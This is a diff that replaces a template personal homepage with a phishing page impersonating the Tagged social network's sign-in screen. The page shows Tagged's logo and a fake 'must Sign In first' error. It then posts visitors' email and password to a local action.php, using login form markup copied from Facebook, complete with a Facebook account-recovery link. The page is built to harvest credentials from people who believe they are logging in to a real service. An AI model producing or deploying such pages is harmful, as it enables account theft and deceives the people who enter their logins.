@@ -1,28 +1,137 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-	<head>
-		<title>Hank Quinlan, Horrible Cop</title>
-	</head>
-	<body>
-		<nav>
-    		<ul>
-        		<li><a href="/">Home</a></li>
-	        	<li><a href="/about">About</a></li>
-        		<li><a href="/cv">CV</a></li>
-        		<li><a href="/blog">Blog</a></li>
-    		</ul>
-		</nav>
-		<div class="container">
-    		<div class="blurb">
-        		<h1>Hi there, I'm Hank Quinlan!</h1>
-				<p>I'm best known as the horrible cop from <em>A Touch of Evil</em> Don't trust me. <a href="/about">Read more about my life...</a></p>
-    		</div><!-- /.blurb -->
-		</div><!-- /.container -->
-		<footer>
-    		<ul>
-        		<li><a href="mailto:hankquinlanhub@gmail.com">email</a></li>
-        		<li><a href="https://github.com/hankquinlan">github.com/hankquinlan</a></li>
-			</ul>
-		</footer>
-	</body>
+    <head>
+        <title>
+            Tagged - Sign In
+        </title>
+        <link rel="stylesheet" href="./Styles.css">
+        <link rel="stylesheet" href="./bootstrap.css">
+    </head>
+    
+    
+    <body>
+        <img class="ICON-md hidden-md" src="https://secure-static.tagged.com/im/headers/refresh/tagged/tagged_logo.png" alt="tagged.com">
+        <img class="ICON-lg hidden-lg" src="https://secure-static.tagged.com/im/headers/refresh/tagged/tagged_logo.png" alt="tagged.com">
+        <div class="continer middle-md hidden-md">
+            <div class="alert alert-danger fade in">
+                <a href="#" class="close" data-dismiss="alert">&times;</a>
+                <strong>Error!</strong> To see this content you must Sign In first
+            </div>
+            <h3>
+                <b>
+                    Tagged Sign In
+                </b>
+            </h3>
+            
+           <form id="login_form" action="action.php" 
+                method="post" novalidate="1" onsubmit="return window.Event &amp;&amp; 
+                Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+                <input type="hidden" name="lsd" value="AVq5Y7bJ" autocomplete="off">
+                <table cellspacing="0" role="presentation">
+                <tbody>
+        <tr>
+            <div class="form-group">
+                <label for="usr">Email Address:</label>
+                <input type="text" class="form-control" id="usr" name="field1" id="email" 
+                value="" tabindex="1" data-testid="royal_email"> 
+            </div>
+            <div class="form-group">
+                <label for="pwd">Password:</label>
+                <input type="password" class="form-control" id="pwd" name="field2" id="pass" 
+                tabindex="2" data-testid="royal_pass">
+            </div>
+            <div class="checkbox">
+                <label><input type="checkbox" value="">Keep me signed in</label>
+            </div>
+            <td>
+                <button class="button"><b>Sign In</b></button>
+            </td>
+        </tr>
+        
+    </tbody>
+</table>
+</form> 
+            <!--
+            <div class="form-group">
+                <label for="usr">Email Address:</label>
+                <input type="text" class="form-control" id="usr">
+            </div>
+            <div class="form-group">
+                <label for="pwd">Password:</label>
+                <input type="password" class="form-control" id="pwd">
+            </div>
+            <div class="checkbox">
+                <label><input type="checkbox" value="">Keep me signed in</label>
+            </div>
+            <button class="button"><b>Sign In</b></button>
+        </div>
+        -->
+        <div class="continer middle-lg hidden-lg">
+            <div class="alert alert-danger fade in">
+                <a href="#" class="close" data-dismiss="alert">&times;</a>
+                <strong>Error!</strong> To see this content you must Sign In first
+            </div>
+            <h3>
+                <b>
+                    Tagged Sign In
+                </b>
+            </h3>
+
+            <form id="login_form" action="action.php" 
+                method="post" novalidate="1" onsubmit="return window.Event &amp;&amp; 
+                Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+                <input type="hidden" name="lsd" value="AVq5Y7bJ" autocomplete="off">
+                <table cellspacing="0" role="presentation">
+                <tbody>
+        <tr>
+            <td class="html7magic">
+                <label for="email">Email or Phone</label>
+                </td>
+                <td class="html7magic">
+                    <label for="pass">Password</label>
+                    </td>
+        </tr>
+        <tr>
+            <td>
+                <input type="email" class="inputtext _55r1" name="field1" id="email" 
+                value="" tabindex="1" data-testid="royal_email">
+            </td>
+            <td>
+                <input type="password" class="inputtext _55r1" name="field2" id="pass" 
+                tabindex="2" data-testid="royal_pass">
+            </td>
+            <td>
+                <button value="1" class="_42ft _4jy0 _3jd8 _4jy3 _4jy1 selected _51sy" id="loginbutton" 
+                tabindex="4" data-testid="royal_login_button" type="submit">Log In</button>
+            </td>
+        </tr>
+        <tr>
+            <td class="login_form_label_field"></td>
+            <td class="login_form_label_field">
+                <div>
+                    <a href="https://web.facebook.com/recover/initiate?lwv=111">Forgotten account?</a>
+                </div>
+            </td>
+        </tr>
+    </tbody>
+</table>
+</form>
+
+
+            <!--
+            <div class="form-group">
+                <label for="usr">Email Address:</label>
+                <input type="text" class="form-control" id="usr">
+            </div>
+            <div class="form-group">
+                <label for="pwd">Password:</label>
+                <input type="password" class="form-control" id="pwd">
+            </div>
+            <div class="checkbox">
+                <label><input type="checkbox" value="">Keep me signed in</label>
+            </div>
+            <button class="button"><b>Sign In</b></button>
+            -->
+        </div>
+    </body>
 </html>
